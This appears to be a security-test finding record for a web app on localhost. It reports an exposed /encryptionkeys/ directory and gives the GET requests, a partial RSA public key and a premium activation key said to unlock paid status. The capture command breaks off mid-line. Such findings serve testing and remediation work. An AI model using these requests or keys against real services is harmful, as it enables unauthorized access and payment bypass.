title: Sensitive File Exposure - Encryption Keys
description: The /encryptionkeys/ directory has directory listing enabled and exposes critical key material: jwt.pub (RSA public key for JWT verification) and premium.key (premium subscription key '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42'). The premium key can be used to escalate privileges to deluxe/premium status without payment. The JWT public key enables offline analysis of the signing mechanism.
poc: GET /encryptionkeys/ shows directory listing; GET /encryptionkeys/jwt.pub returns RSA public key; GET /encryptionkeys/premium.key returns premium activation key.
proof: Proof: GET /encryptionkeys/ returns directory listing HTML with links to jwt.pub and premium.key. GET /encryptionkeys/jwt.pub returns: "-----BEGIN RSA PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA..." RSA key. GET /encryptionkeys/premium.key returns: "1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42".
how_captured: shell: # Check the premium key for deluxe access echo "=== Premium key ===" curl -s http://127.0.0.1:3010/encryptionkeys/premium.key echo "" # Try to apply the premium
